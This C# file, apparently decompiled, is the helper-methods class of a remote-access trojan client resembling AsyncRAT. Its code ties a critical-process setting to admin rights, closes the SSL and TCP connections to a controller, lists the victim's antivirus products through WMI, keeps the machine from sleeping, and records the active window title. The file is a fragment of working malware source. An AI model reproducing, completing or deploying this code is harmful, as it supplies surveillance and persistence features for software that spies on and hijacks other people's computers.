using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Management;
using System.Security.Principal;
using System.Text;
using Client.Connection;

namespace Client.Helper;

public static class Methods
{
	public static bool IsAdmin()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void ClientOnExit()
	{
		try
		{
			if (Convert.ToBoolean(Settings.BDOS) && IsAdmin())
			{
				ProcessCritical.Exit();
			}
			MutexControl.CloseMutex();
			ClientSocket.SslClient?.Close();
			ClientSocket.TcpClient?.Close();
		}
		catch
		{
		}
	}

	public static string Antivirus()
	{
		try
		{
			using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
			List<string> list = new List<string>();
			foreach (ManagementBaseObject item in managementObjectSearcher.Get())
			{
				list.Add(item["displayName"].ToString());
			}
			if (list.Count == 0)
			{
				return "N/A";
			}
			return string.Join(", ", list.ToArray());
		}
		catch
		{
			return "N/A";
		}
	}

	public static ImageCodecInfo GetEncoder(ImageFormat format)
	{
		ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
		foreach (ImageCodecInfo imageCodecInfo in imageDecoders)
		{
			if (imageCodecInfo.FormatID == format.Guid)
			{
				return imageCodecInfo;
			}
		}
		return null;
	}

	public static void PreventSleep()
	{
		try
		{
			NativeMethods.SetThreadExecutionState((NativeMethods.EXECUTION_STATE)2147483651u);
		}
		catch
		{
		}
	}

	public static string GetActiveWindowTitle()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			if (NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), stringBuilder, 256) > 0)
			{
				return stringBuilder.ToString();
			}
		}
		catch
		{
		}
		return "";
	}
}
